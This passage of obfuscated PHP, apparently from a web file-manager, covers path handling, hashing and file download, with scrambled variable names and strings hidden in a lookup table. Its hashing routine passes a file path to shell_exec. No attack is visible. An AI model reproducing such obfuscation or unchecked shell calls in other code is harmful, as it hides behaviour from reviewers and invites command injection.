$Ö£½ÃÍß[$â´ñ½Ñ[67]]); } } return $”¢îı’; } public function getTables($Âõ…ÂË = '') { $›‰ËìãÀ =& $_SERVER[‚ûòÉ˜ş]; $°âÈ÷ç = $this->query($›‰ËìãÀ[55] . $›‰ËìãÀ[56] . $›‰ËìãÀ[57]); $¤ß‡»‰Š = array(); foreach ($°âÈ÷ç as $ë‹°œÏ± => $”ùàÉÇ²) { $¤ß‡»‰Š[$ë‹°œÏ±] = current($”ùàÉÇ²); } return $¤ß‡»‰Š; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ƒ¤ª…· =& $_SERVER[‚ûòÉ˜ş]; $this->error = $this->_linkID->lastErrorMsg(); if ($ƒ¤ª…·[12] != $this->queryStr) { $this->error .= LNG($ƒ¤ª…·[58]) . $this->queryStr; } think_trace($this->error, $ƒ¤ª…·[12], $ƒ¤ª…·[59]); return $this->error; } public function escapeString($÷¡Ì†Òö) { $—¢ÈÀª =& $_SERVER[‚ûòÉ˜ş]; if ($this->_linkID) { return $this->_linkID->escapeString($÷¡Ì†Òö); } return str_ireplace($—¢ÈÀª[68], $—¢ÈÀª[69], $÷¡Ì†Òö); } public function parseLimit($ßØª÷ñ°) { $È€€ßÒ =& $_SERVER[‚ûòÉ˜ş]; $¨‹¢½˜Ô = $È€€ßÒ[12]; if (!empty($ßØª÷ñ°)) { $ßØª÷ñ° = explode($È€€ßÒ[60], $ßØª÷ñ°); if (count($ßØª÷ñ°) > 1) { $¨‹¢½˜Ô .= $È€€ßÒ[61] . $ßØª÷ñ°[1] . $È€€ßÒ[62] . $ßØª÷ñ°[0] . $È€€ßÒ[63]; } else { $¨‹¢½˜Ô .= $È€€ßÒ[61] . $ßØª÷ñ°[0] . $È€€ßÒ[63]; } } return $¨‹¢½˜Ô; } } class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $°ÔÅ÷ =& $_SERVER[‚ûòÉ˜ş]; $this->objectDriver = array($°ÔÅ÷[70], $°ÔÅ÷[71], $°ÔÅ÷[72], $°ÔÅ÷[73], $°ÔÅ÷[74], $°ÔÅ÷[75], $°ÔÅ÷[76], $°ÔÅ÷[77], $°ÔÅ÷[78]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($¤¾¼¹»è) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($¤¾¼¹»è, $_SERVER[‚ûòÉ˜ş][8]); } return $¤¾¼¹»è; } public function iconvApp($Çó¾‚õæ) { return $Çó¾‚õæ; } public function iconvSystem($Õ†Á‹Ïâ) { return $Õ†Á‹Ïâ; } public function iconvTo($ªŞê×üö, $ŒœÈ²á´, $–ê¿‘ÚŸ) { $É¶ç‹ÇÉ =& $_SERVER[‚ûòÉ˜ş]; if (!$ªŞê×üö || !function_exists($É¶ç‹ÇÉ[79])) { return $ªŞê×üö; } static $İ·±ıÚ— = array(); $´ÁĞüÂ = $ŒœÈ²á´ . $É¶ç‹ÇÉ[80] . $–ê¿‘ÚŸ . $É¶ç‹ÇÉ[81] . $ªŞê×üö; if (isset($İ·±ıÚ—[$´ÁĞüÂ])) { return $İ·±ıÚ—[$´ÁĞüÂ]; } if (function_exists($É¶ç‹ÇÉ[82])) { $®çˆ’Ğ = @mb_convert_encoding($ªŞê×üö, $–ê¿‘ÚŸ, $ŒœÈ²á´); } else { $®çˆ’Ğ = @iconv($ŒœÈ²á´, $–ê¿‘ÚŸ, $ªŞê×üö); } $®çˆ’Ğ = $®çˆ’Ğ ? $®çˆ’Ğ : $ªŞê×üö; if (strstr($®çˆ’Ğ, $É¶ç‹ÇÉ[83])) { $®çˆ’Ğ = str_replace($É¶ç‹ÇÉ[83], $É¶ç‹ÇÉ[11], $®çˆ’Ğ); } $İ·±ıÚ—[$ŒœÈ²á´ . $É¶ç‹ÇÉ[80] . $–ê¿‘ÚŸ . $É¶ç‹ÇÉ[81] . $ªŞê×üö] = $®çˆ’Ğ; $İ·±ıÚ—[$–ê¿‘ÚŸ . $É¶ç‹ÇÉ[80] . $ŒœÈ²á´ . $É¶ç‹ÇÉ[81] . $ªŞê×üö] = $ªŞê×üö; $İ·±ıÚ—[$–ê¿‘ÚŸ . $É¶ç‹ÇÉ[80] . $ŒœÈ²á´ . $É¶ç‹ÇÉ[81] . $®çˆ’Ğ] = $ªŞê×üö; $İ·±ıÚ—[$ŒœÈ²á´ . $É¶ç‹ÇÉ[80] . $–ê¿‘ÚŸ . $É¶ç‹ÇÉ[81] . $®çˆ’Ğ] = $®çˆ’Ğ; return $®çˆ’Ğ; } public function getPathInner($Ô”ıßÀî) { $«ü‰ŠÓ = IO::init($Ô”ıßÀî); return $«ü‰ŠÓ->path; } public function getPathOuter($´¥Ş×™’) { $«òÕÁÅ´ =& $_SERVER[‚ûòÉ˜ş]; $°À‚€Ï = strlen(trim($this->pathBase, $«òÕÁÅ´[8])); $´¥Ş×™’ = substr(trim($´¥Ş×™’, $«òÕÁÅ´[8]), $°À‚€Ï); return $this->pathDriver . $«òÕÁÅ´[8] . ltrim($´¥Ş×™’, $«òÕÁÅ´[8]); } public function isParentOf($ãÄ¯Æ¦, $ˆÁëÈ¸) { $–óÁ¶ï× =& $_SERVER[‚ûòÉ˜ş]; $ãÄ¯Æ¦ = rtrim(strtolower($ãÄ¯Æ¦), $–óÁ¶ï×[8]) . $–óÁ¶ï×[8]; $ˆÁëÈ¸ = rtrim(strtolower($ˆÁëÈ¸), $–óÁ¶ï×[8]) . $–óÁ¶ï×[8]; $ÏÉºÎæ = strpos($ˆÁëÈ¸, $ãÄ¯Æ¦) === 0; return $ÏÉºÎæ; } public function getType() { $ñ¥õàé¤ =& $_SERVER[‚ûòÉ˜ş]; $Îä´á© = str_replace($ñ¥õàé¤[84], $ñ¥õàé¤[12], get_class($this)); return strtolower($Îä´á©); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($¸‹±’Ö, $¸³ˆœô¢) { $Ü§‚¨ì =& $_SERVER[‚ûòÉ˜ş]; $ĞëÚ¡à– = rtrim($¸‹±’Ö, $Ü§‚¨ì[8]) . $Ü§‚¨ì[8] . $¸³ˆœô¢; $ø¢„åë¼ = $this->exist($ĞëÚ¡à–); return $ø¢„åë¼ ? $ĞëÚ¡à– : !1; } public function setModifyTime($Ø·¹Å©Ä, $«Á—–ß = '') { } public function renameObject($ŠŞ¦à‡Ò, $¡—ÒµŸ²) { $Ç¸Ğò¢¿ = $¡—ÒµŸ²; $ŠŞ¦à‡Ò = $this->getPathOuter($ŠŞ¦à‡Ò); $¡—ÒµŸ² = $this->pathFather($ŠŞ¦à‡Ò) . $¡—ÒµŸ²; $ßŠ¼ÏÛ = IO::copy($ŠŞ¦à‡Ò, $this->pathFather($ŠŞ¦à‡Ò), REPEAT_RENAME_FOLDER, $Ç¸Ğò¢¿); if ($ßŠ¼ÏÛ) { IO::remove($ŠŞ¦à‡Ò); } return $ßŠ¼ÏÛ ? $¡—ÒµŸ² : !1; } public function tempFile($¼äûÆÆš = '', $†àŞİÑ = '') { if (!$¼äûÆÆš) { $¼äûÆÆš = rand_string(15); } $ÀÚÊ²ê® = TEMP_FILES . rand_string(15) . $_SERVER[‚ûòÉ˜ş][8]; @mkdir($ÀÚÊ²ê®, DEFAULT_PERRMISSIONS, !0); $å–ÃÁÓ® = $ÀÚÊ²ê® . $¼äûÆÆš; @touch($å–ÃÁÓ®); if ($†àŞİÑ) { file_put_contents($å–ÃÁÓ®, $†àŞİÑ); } return $å–ÃÁÓ®; } public function tempFileRemve($ó‰¾Ãæ) { @unlink($ó‰¾Ãæ); @rmdir($this->pathFather($ó‰¾Ãæ)); } public function mkfile($¶ØÃøÅ, $ÈÕ…ç¹ö = '', $Øƒ’Èâ¦ = REPEAT_RENAME) { } public function mkdir($Óî©øµÄ, $Ú¼ê·÷ = REPEAT_SKIP) { } public function delFile($•„œÄºÙ) { } public function delFolder($öñìÈŞ) { } public function copyFile($Çğû°ç , $¥³“½ÜŒ) { } public function moveFile($ÀıØ†ãı, $æ¿Æ—Ç) { } public function remove($ßÓ¿Ğ¶×) { if ($this->isFile($ßÓ¿Ğ¶×)) { return $this->delFile($ßÓ¿Ğ¶×); } return $this->delFolder($ßÓ¿Ğ¶×); } public function rename($Ÿ‘¼µÏŞ, $«à¼¾É©) { } public function exist($Ğ÷Ó²ÅÕ) { } public function findByHash($Ø…Œ ®» = '', $Ú™ø¶Ø = '') { return !1; } public function isFile($úˆÜ©ùº) { } public function isFolder($İ¯Ú™â) { } public function size($¾ş‰´¥ı) { } public function info($Ø §Šº„) { } public function infoSimple($Ã«Ââõ¦) { return $this->info($Ã«Ââõ¦); } public function infoAuth($´ææÇ…¬) { return $this->info($´ææÇ…¬); } public function infoFull($Œ‡“ê¢Ú) { return $this->info($Œ‡“ê¢Ú); } public function infoFullSimple($ÑñàìØÇ) { return $this->info($ÑñàìØÇ); } public function infoWithChildren($òÙµ”°) { $—Ş¸”Ôš =& $_SERVER[‚ûòÉ˜ş]; static $ñ…°Ùù‘ = array(); if (isset($ñ…°Ùù‘[$òÙµ”°])) { return $ñ…°Ùù‘[$òÙµ”°]; } $ÏµººÍ¯ = $this->info($òÙµ”°); if ($ÏµººÍ¯ && $ÏµººÍ¯[$—Ş¸”Ôš[43]] == $—Ş¸”Ôš[85]) { $å†úëêé = array($—Ş¸”Ôš[86] => 0, $—Ş¸”Ôš[87] => 0, $—Ş¸”Ôš[88] => 0); $this->infoChildren($òÙµ”°, $å†úëêé); $ÏµººÍ¯[$—Ş¸”Ôš[86]] = $å†úëêé[$—Ş¸”Ôš[86]]; $ÏµººÍ¯[$—Ş¸”Ôš[89]] = array($—Ş¸”Ôš[90] => $å†úëêé[$—Ş¸”Ôš[87]], $—Ş¸”Ôš[91] => $å†úëêé[$—Ş¸”Ôš[88]]); $ñ…°Ùù‘[$òÙµ”°] = $ÏµººÍ¯; } return $ÏµººÍ¯; } public function listPath($»Ô™»Í, $Ïµª…¿Ğ = false) { } public function has($ ®ùŠš•, $×¶„‰¤ = false, $Ÿõßç¥˜ = false) { } public function canRead($³ğƒ•ÎÁ) { } public function canWrite($ƒ½àºš) { } public function getContent($¡¥Å“ö©) { } public function setContent($ ¹Åµ, $¹Ğæëİ = '') { } protected function infoChildren($ë¶¢–Û, &$Ÿãõ¢±) { $àô·Ëç† =& $_SERVER[‚ûòÉ˜ş]; check_abort_echo(); $ş¦ÔÚ³Û = $this->listPath($ë¶¢–Û, !0); $ş¦ÔÚ³Û = array_merge($ş¦ÔÚ³Û[$àô·Ëç†[92]], $ş¦ÔÚ³Û[$àô·Ëç†[93]]); foreach ($ş¦ÔÚ³Û as $š‡›Éë¥) { if ($š‡›Éë¥[$àô·Ëç†[43]] == $àô·Ëç†[85]) { $Ÿãõ¢±[$àô·Ëç†[88]]++; $ÔËÄ‚ÈÄ = $this->getPathInner($š‡›Éë¥[$àô·Ëç†[94]]); $this->infoChildren($ÔËÄ‚ÈÄ, $Ÿãõ¢±); } else { $Ÿãõ¢±[$àô·Ëç†[87]]++; $Ÿãõ¢±[$àô·Ëç†[86]] += $š‡›Éë¥[$àô·Ëç†[86]]; } } } public function fileSubstr($É½ñÁÑ, $êÄÔ´¥, $¾‚ªØ†Í) { } public function listAll($ıèîê¿Û) { } public function listAllMake($Ï•ÄæüÓ, &$ï×¬Ëˆã) { $õ™±£‡œ =& $_SERVER[‚ûòÉ˜ş]; check_abort_echo(); $—İ¬í€× = $this->listPath($Ï•ÄæüÓ, !0); if (!$—İ¬í€×) { return; } $¢ØÃß©¤ = array_merge($—İ¬í€×[$õ™±£‡œ[92]], $—İ¬í€×[$õ™±£‡œ[93]]); foreach ($¢ØÃß©¤ as $å×–æ¥±) { $¾Ò—÷ŞÈ = $å×–æ¥±[$õ™±£‡œ[43]] == $õ™±£‡œ[85]; $ìÄí‡í = array($õ™±£‡œ[94] => $å×–æ¥±[$õ™±£‡œ[94]], $õ™±£‡œ[85] => $¾Ò—÷ŞÈ); if (isset($å×–æ¥±[$õ™±£‡œ[86]])) { $ìÄí‡í[$õ™±£‡œ[86]] = $å×–æ¥±[$õ™±£‡œ[86]]; } if (isset($å×–æ¥±[$õ™±£‡œ[95]])) { $ìÄí‡í[$õ™±£‡œ[95]] = $å×–æ¥±[$õ™±£‡œ[95]]; } if (!$¾Ò—÷ŞÈ) { $ï×¬Ëˆã[] = $ìÄí‡í; continue; } $ï×¬Ëˆã[] = $ìÄí‡í; $ËïÖ™›Å = $å×–æ¥±[$õ™±£‡œ[94]]; $½¸•ş¸÷ = $this->pathDriver; if (substr($å×–æ¥±[$õ™±£‡œ[94]], 0, strlen($½¸•ş¸÷)) == $½¸•ş¸÷) { $ËïÖ™›Å = substr($ËïÖ™›Å, strlen($½¸•ş¸÷)); } $this->listAllMake($ËïÖ™›Å, $ï×¬Ëˆã); } } public function listAllSimple($Ù†ËÚÌ¾, $âªˆç«Ü = false) { $ŒÎİè = $this->listAll($Ù†ËÚÌ¾); return $this->listAllSimpleMake($ŒÎİè, $this->getPathOuter($Ù†ËÚÌ¾), $âªˆç«Ü); } public function listAllSimpleMake($€¾ÂòÚ¯, $‹ş†Õäğ, $€à”Ä¦Ü) { $ªœó½¸ê =& $_SERVER[‚ûòÉ˜ş]; $İ‘µ = array(); $‹ş†Õäğ = rtrim(get_path_father($‹ş†Õäğ), $ªœó½¸ê[8]) . $ªœó½¸ê[8]; foreach ($€¾ÂòÚ¯ as $Ø”ƒ®òÛ) { $¨¤Ù¼º´ = array($ªœó½¸ê[94] => $Ø”ƒ®òÛ[$ªœó½¸ê[94]], $ªœó½¸ê[96] => $Ø”ƒ®òÛ[$ªœó½¸ê[94]], $ªœó½¸ê[85] => $Ø”ƒ®òÛ[$ªœó½¸ê[85]]); if (isset($Ø”ƒ®òÛ[$ªœó½¸ê[86]]) && !$Ø”ƒ®òÛ[$ªœó½¸ê[85]]) { $¨¤Ù¼º´[$ªœó½¸ê[86]] = $Ø”ƒ®òÛ[$ªœó½¸ê[86]]; } if (isset($Ø”ƒ®òÛ[$ªœó½¸ê[95]])) { $¨¤Ù¼º´[$ªœó½¸ê[95]] = $Ø”ƒ®òÛ[$ªœó½¸ê[95]]; } if (is_array($Ø”ƒ®òÛ[$ªœó½¸ê[97]])) { $¨¤Ù¼º´[$ªœó½¸ê[96]] = $Ø”ƒ®òÛ[$ªœó½¸ê[97]][$ªœó½¸ê[94]]; $¨¤Ù¼º´[$ªœó½¸ê[86]] = $Ø”ƒ®òÛ[$ªœó½¸ê[97]][$ªœó½¸ê[86]]; $¨¤Ù¼º´[$ªœó½¸ê[95]] = $Ø”ƒ®òÛ[$ªœó½¸ê[97]][$ªœó½¸ê[95]]; } else { if (substr($Ø”ƒ®òÛ[$ªœó½¸ê[94]], 0, strlen($‹ş†Õäğ)) == $‹ş†Õäğ) { $¨¤Ù¼º´[$ªœó½¸ê[94]] = substr($Ø”ƒ®òÛ[$ªœó½¸ê[94]], strlen($‹ş†Õäğ)); } } $ê©ã½Á = $Ø”ƒ®òÛ[$ªœó½¸ê[85]] ? $ªœó½¸ê[8] : $ªœó½¸ê[12]; $¨¤Ù¼º´[$ªœó½¸ê[96]] = rtrim($¨¤Ù¼º´[$ªœó½¸ê[96]], $ªœó½¸ê[8]) . $ê©ã½Á; $¨¤Ù¼º´[$ªœó½¸ê[94]] = $ªœó½¸ê[8] . trim($¨¤Ù¼º´[$ªœó½¸ê[94]], $ªœó½¸ê[8]) . $ê©ã½Á; if (!$€à”Ä¦Ü) { $à‡áÙÁè = explode($ªœó½¸ê[8], trim($¨¤Ù¼º´[$ªœó½¸ê[94]], $ªœó½¸ê[8])); $¨¤Ù¼º´[$ªœó½¸ê[94]] = $ªœó½¸ê[8] . implode($ªœó½¸ê[8], array_slice($à‡áÙÁè, 1)) . $ê©ã½Á; } $İ‘µ[] = $¨¤Ù¼º´; } return array_sort_by($İ‘µ, $ªœó½¸ê[94]); } public function upload($©ÇÆà¶, $¦õ¢ÏŸü, $Á†ÑÖáö = false, $šÏ™Åš® = REPEAT_REPLACE) { } public function uploadFileByID($Áõû™İó, $ËÅäê´, $èÀ¿›¡„) { } public function uploadFileByPath($Œ•úÎËÊ, $„³Ÿà–, $êòæ®ì­ = array()) { } public function isUploadServer() { $Ûªæ½§ =& $_SERVER[‚ûòÉ˜ş]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $Ûªæ½§[98]) { return !0; } return $GLOBALS[$Ûªæ½§[6]][$Ûªæ½§[99]][$Ûªæ½§[100]]; } public function isFileOutServer() { $ªøÔÓÅ =& $_SERVER[‚ûòÉ˜ş]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $ªøÔÓÅ[98]) { return !0; } return $GLOBALS[$ªøÔÓÅ[6]][$ªøÔÓÅ[99]][$ªøÔÓÅ[101]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($¸ˆÑ „ı) { $«Ï¾¹İ =& $_SERVER[‚ûòÉ˜ş]; if (!$this->isCdnHost()) { return $¸ˆÑ „ı; } return str_replace(trim(get_url_root($¸ˆÑ „ı), $«Ï¾¹İ[8]), trim($this->cdnHost, $«Ï¾¹İ[8]), $¸ˆÑ „ı); } public function uploadLink($Á¶ë€Ã¹, $êÌµà¢ = 0) { $‘âàË–… =& $_SERVER[‚ûòÉ˜ş]; if ($this->isUploadServer()) { return; } $ÈàÛ²İ£ = $this->getType(); if (!in_array($ÈàÛ²İ£, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $‹Ä¾‰İ³ = 1024 * 1024 * 10; $ëËêòü = $êÌµà¢ <= $‹Ä¾‰İ³ ? $‘âàË–…[102] : $‘âàË–…[103]; $­¹„”ÒÁ = (!$êÌµà¢ ? 1 : ceil($êÌµà¢ / pow(1024, 3))) * 3600 * 4; $Œ“‡±Ç = $this->{$ëËêòü}($Á¶ë€Ã¹, $­¹„”ÒÁ); if ($Œ“‡±Ç) { $Œ“‡±Ç[$‘âàË–…[104]] = $Á¶ë€Ã¹; $Œ“‡±Ç[$‘âàË–…[105]] = $ÈàÛ²İ£; } return $Œ“‡±Ç; } public function uploadFormData($ş‹èıÆ, $–øŒÀŠ = 3600) { } public function multiUploadFormData($ñì—², $ˆÅ¥ êÌ = 3600) { } public function download($Ë‰ñà‘Á, $ë¸îÀéî) { } public function ext($æóÑˆÁì) { $Â•¨ñŸ— =& $_SERVER[‚ûòÉ˜ş]; if (strpos($æóÑˆÁì, $Â•¨ñŸ—[8]) === -1) { $ÍåÓ·Ç = $æóÑˆÁì; } else { $ÍåÓ·Ç = $this->pathThis($æóÑˆÁì); } $¬Ìê‰ëä = $Â•¨ñŸ—[12]; if (strstr($ÍåÓ·Ç, $Â•¨ñŸ—[10])) { $¬Ìê‰ëä = substr($ÍåÓ·Ç, strrpos($ÍåÓ·Ç, $Â•¨ñŸ—[10]) + 1); $¬Ìê‰ëä = strtolower($¬Ìê‰ëä); } if (strlen($¬Ìê‰ëä) > 3 && preg_match($Â•¨ñŸ—[106], $¬Ìê‰ëä, $¡ªá¼)) { $¬Ìê‰ëä = $Â•¨ñŸ—[12]; } return $¬Ìê‰ëä; } public function pathThis($ŠÊ—½ê³) { $¼›Œ¹·Ã =& $_SERVER[‚ûòÉ˜ş]; $ŠÊ—½ê³ = str_replace($¼›Œ¹·Ã[107], $¼›Œ¹·Ã[8], rtrim($ŠÊ—½ê³, $¼›Œ¹·Ã[8])); $ü­çİå = strrpos($ŠÊ—½ê³, $¼›Œ¹·Ã[8]); if ($ü­çİå === !1) { return $ŠÊ—½ê³; } return substr($ŠÊ—½ê³, $ü­çİå + 1); } public function pathFather($È£¹…³À) { $Í§‡·• =& $_SERVER[‚ûòÉ˜ş]; $È£¹…³À = str_replace($Í§‡·•[107], $Í§‡·•[8], rtrim($È£¹…³À, $Í§‡·•[8])); $ÇŒ©¼ï = strrpos($È£¹…³À, $Í§‡·•[8]); if ($ÇŒ©¼ï === !1) { return $Í§‡·•[12]; } return substr($È£¹…³À, 0, $ÇŒ©¼ï + 1); } public function hashSimple($Ñ¤È©Ğî) { $ùÂÚÛªõ =& $_SERVER[‚ûòÉ˜ş]; if (!$Ñ¤È©Ğî) { return md5($ùÂÚÛªõ[12]); } $Ìœ•å˜Ç = $this->size($Ñ¤È©Ğî); $ØÑ ½Çò = 200; $Ùºç‘ùê = 50; if ($Ìœ•å˜Ç <= $ØÑ ½Çò * $Ùºç‘ùê) { return $this->hashMd5($Ñ¤È©Ğî) . $Ìœ•å˜Ç; } $¡é¨¥ŒÆ = intval($Ìœ•å˜Ç / $Ùºç‘ùê); $…¡‡âÖ‘ = $ùÂÚÛªõ[12]; for ($•ñ˜œ¿ = 0; $•ñ˜œ¿ < $Ùºç‘ùê; $•ñ˜œ¿++) { $…¡‡âÖ‘ .= $this->fileSubstr($Ñ¤È©Ğî, $¡é¨¥ŒÆ * $•ñ˜œ¿, $ØÑ ½Çò); } $…¡‡âÖ‘ .= $this->fileSubstr($Ñ¤È©Ğî, $Ìœ•å˜Ç - $ØÑ ½Çò, $ØÑ ½Çò); return md5($…¡‡âÖ‘) . $Ìœ•å˜Ç; } public static $md5Cache = array(); public function hashMd5($‚ÙÒ¯) { if (!$‚ÙÒ¯) { return md5($_SERVER[‚ûòÉ˜ş][12]); } $‚ÙÒ¯ = $this->iconvSystem($‚ÙÒ¯); if (isset(self::$md5Cache[$‚ÙÒ¯])) { return self::$md5Cache[$‚ÙÒ¯]; } self::$md5Cache[$‚ÙÒ¯] = $this->hashMd5Shell($‚ÙÒ¯); if (!self::$md5Cache[$‚ÙÒ¯]) { self::$md5Cache[$‚ÙÒ¯] = @md5_file($‚ÙÒ¯); } return self::$md5Cache[$‚ÙÒ¯]; } private function hashMd5Shell($Ëåµœ™“) { $æé…â =& $_SERVER[‚ûòÉ˜ş]; if (!$Ëåµœ™“) { return md5($æé…â[12]); } if (!function_exists($æé…â[108])) { return !1; } $é—¢„İÇ = array($æé…â[109], $æé…â[110]); $¶’öÏæá = Cache::get($æé…â[111]); if (!$¶’öÏæá) { $°ìœÊÛÒ = BASIC_PATH . $æé…â[112]; $Öº‡Ê† = md5_file($°ìœÊÛÒ); $¶’öÏæá = $æé…â[113]; foreach ($é—¢„İÇ as $çñÌˆçè) { $ŠÑõ å” = shell_exec($çñÌˆçè . "\40\x22{$°ìœÊÛÒ}\x22"); if ($ŠÑõ å” && substr(trim($ŠÑõ å”), 0, 32) == $Öº‡Ê†) { $¶’öÏæá = $çñÌˆçè; break; } } Cache::set($æé…â[111], $¶’öÏæá, 3600); } if ($¶’öÏæá == $æé…â[113]) { return !1; } $ŠÑõ å” = shell_exec($¶’öÏæá . "\x20\42{$Ëåµœ™“}\42"); $ŠÑõ å” = str_replace($æé…â[114], $æé…â[12], $ŠÑõ å”); return substr($ŠÑõ å”, 0, 32); } public function link($¹İ¿®¼ü) { return $¹İ¿®¼ü; } public function fileOut($×ó÷òÑá, $´àı›ğ = false, $ãÂæ­ç„ = false, $İö¼­†Ù = '') { $Œ±úñÖ =& $_SERVER[‚ûòÉ˜ş]; $this->cacheMethod(null, null); if (!$×ó÷òÑá || !$this->exist($×ó÷òÑá)) { show_json(LNG($Œ±úñÖ[115]), !1, $ãÂæ­ç„); } $øÁ¼¹® = $this->getType() == $Œ±úñÖ[116]; $Ë’ƒ¤íƒ = $GLOBALS[$Œ±úñÖ[6]][$Œ±úñÖ[99]][$Œ±úñÖ[117]][$Œ±úñÖ[118]]; $µª×¥ŞÙ = (double) $GLOBALS[$Œ±úñÖ[6]][$Œ±úñÖ[99]][$Œ±úñÖ[117]][$Œ±úñÖ[119]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $òòøÒà = $this->infoFull($×ó÷òÑá); $Ûâšš¤˜ = $òòøÒà[$Œ±úñÖ[86]]; $×†ºõİ¼ = gmdate($Œ±úñÖ[120], $òòøÒà[$Œ±úñÖ[95]]); $­šÃãæ = $ãÂæ­ç„ ? $ãÂæ­ç„ : $this->iconvApp($òòøÒà[$Œ±úñÖ[42]]); $›àÚï× = 0; $œ˜Æ‹ãÀ = $Ûâšš¤˜ - 1; $£ÉøöÛë = $this->ext($­šÃãæ); if (in_array($£ÉøöÛë, array($Œ±úñÖ[121], $Œ±úñÖ[122], $Œ±úñÖ[123], $Œ±úñÖ[124]))) { $£ÉøöÛë = $Œ±úñÖ[125]; } if (in_array($£ÉøöÛë, array($Œ±úñÖ[126]))) { $£ÉøöÛë = $Œ±úñÖ[127]; } if (!$İö¼­†Ù) { $İö¼­†Ù = md5($×†ºõİ¼ . $Ûâšš¤˜); } $İö¼­†Ù = $Œ±úñÖ[128] . $İö¼­†Ù . $Œ±úñÖ[128]; $Ç·§Ò¦‰ = get_file_mime($£ÉøöÛë); $ïÚˆûğ± = !0; $ïÚˆûğ± = isset($_GET[$Œ±úñÖ[129]]) ? !1 : !0; if ($´àı›ğ === !1 && !mime_support($Ç·§Ò¦‰)) { $Ç·§Ò¦‰ = $Œ±úñÖ[130]; } header($Œ±úñÖ[131]); header($Œ±úñÖ[132] . $Ç·§Ò¦‰); $ìå½ñš£ = rawurlencode($­šÃãæ); $ìå½ñš£ = $Œ±úñÖ[128] . $ìå½ñš£ . $Œ±úñÖ[133] . $ìå½ñš£; if ($´àı›ğ) { header($Œ±úñÖ[134]); header($Œ±úñÖ[135] . $ìå½ñš£); } else { if ($ïÚˆûğ±) { header($Œ±úñÖ[136] . $ìå½ñš£); } } header($Œ±úñÖ[137] . gmdate($Œ±úñÖ[120], time() + 3600 * 24 * 30) . $Œ±úñÖ[138]); header($Œ±úñÖ[139]); header($Œ±úñÖ[140]); header($Œ±úñÖ[141]); if (isset($_SERVER[$Œ±úñÖ[142]]) && strtotime($_SERVER[$Œ±úñÖ[142]]) == $òòøÒà[$Œ±úñÖ[95]]) { header($Œ±úñÖ[143], !0, 304); die; } if (isset($_SERVER[$Œ±úñÖ[144]]) && $_SERVER[$Œ±úñÖ[144]] == $İö¼­†Ù) { header($Œ±úñÖ[145] . $İö¼­†Ù, !0, 304); die; } header($Œ±úñÖ[145] . $İö¼­†Ù); header($Œ±úñÖ[146] . $×†ºõİ¼ . $Œ±úñÖ[138]); header($Œ±úñÖ[147] . $­šÃãæ); header($Œ±úñÖ[148]); header($Œ±úñÖ[149] . $Ûâšš¤˜); header($Œ±úñÖ[150]); Hook::trigger($Œ±úñÖ[151], $×ó÷òÑá, $Ûâšš¤˜, $­šÃãæ, $£ÉøöÛë); if (!$´àı›ğ && $£ÉøöÛë == $Œ±úñÖ[152]) { if ($Ûâšš¤˜ > 1024 * 1024 * 5) { die; } $ÉÖâıç = $this->getContent($×ó÷òÑá); $ÉÖâıç = Html::clearSVG($ÉÖâıç); header($Œ±úñÖ[153] . strlen($ÉÖâıç)); echo $ÉÖâıç; die; } $ÕÖÚÒúï = strtolower($_SERVER[$Œ±úñÖ[154]]); if ($øÁ¼¹® && $ÕÖÚÒúï && $Ë’ƒ¤íƒ) { if (strstr($ÕÖÚÒúï, $Œ±úñÖ[155])) { header($Œ±úñÖ[156] . $×ó÷òÑá); } else { if (strstr($ÕÖÚÒúï, $Œ±úñÖ[157])) { header($Œ±úñÖ[158] . $×ó÷òÑá); } else { if (strstr($ÕÖÚÒúï, $Œ±úñÖ[159])) { header($Œ±úñÖ[160] . $×ó÷òÑá); } } } if ($µª×¥ŞÙ) { header($Œ±úñÖ[161] . $µª×¥ŞÙ); } return; } if (isset($_SERVER[$Œ±úñÖ[162]])) { if (preg_match($Œ±úñÖ[163], $_SERVER[$Œ±úñÖ[162]], $–Şì×ûÜ)) { $›àÚï× = intval($–Şì×ûÜ[1]); $›àÚï× = $›àÚï× <= 0 ? 0 : ($›àÚï× >= $œ˜Æ‹ãÀ ? $œ˜Æ‹ãÀ : $›àÚï×); if (!empty($–Şì×ûÜ[2])) { $éÅúÃ¿ = intval($–Şì×ûÜ[2]); $œ˜Æ‹ãÀ = $éÅúÃ¿ < $›àÚï× ? $›àÚï× : ($éÅúÃ¿ >= $œ˜Æ‹ãÀ ? $œ˜Æ‹ãÀ : $éÅúÃ¿); } } header($Œ±úñÖ[164]); header("\103\x6f\156\164\x65\x6e\164\x2d\122\141\156\147\x65\x3a\40\x62\171\x74\145\x73\40{$›àÚï×}\x2d{$œ˜Æ‹ãÀ}\x2f" . $Ûâšš¤˜); } else { header($Œ±úñÖ[165]); } header($Œ±úñÖ[166]); $ö¡À»õ = !0; if ($_SERVER[$Œ±úñÖ[167]] == $Œ±úñÖ[168] && $Ûâšš¤˜ > 1204 * 1024 * 1024 * 2) { $ö¡À»õ = !1; } if ($ö¡À»õ) { header($Œ±úñÖ[169] . ($œ˜Æ‹ãÀ - $›àÚï× + 1)); } if ($_SERVER[$Œ±úñÖ[170]] == $Œ±úñÖ[171]) { return; } $·¾ÇÎŠ÷ = 1024 * 100; $¿Ø•©¦ = 0; if ($µª×¥ŞÙ) { $¿Ø•©¦ = intval(1000 * 1000 * ($·¾ÇÎŠ÷ / $µª×¥ŞÙ)); } while ($›àÚï× <= $œ˜Æ‹ãÀ) { $›¼é°­› = timeFloat(); check_abort(); $ÙûšÁ€  = $œ˜Æ‹ãÀ - $›àÚï× + 1; if ($ÙûšÁ€  <= $·¾ÇÎŠ÷) { $·¾ÇÎŠ÷ = $ÙûšÁ€ ; } echo $this->fileSubstr($×ó÷òÑá, $›àÚï×, $·¾ÇÎŠ÷); $›àÚï× += $·¾ÇÎŠ÷; if ($·¾ÇÎŠ÷ == $ÙûšÁ€ ) { $›àÚï× = $œ˜Æ‹ãÀ + 1; } if 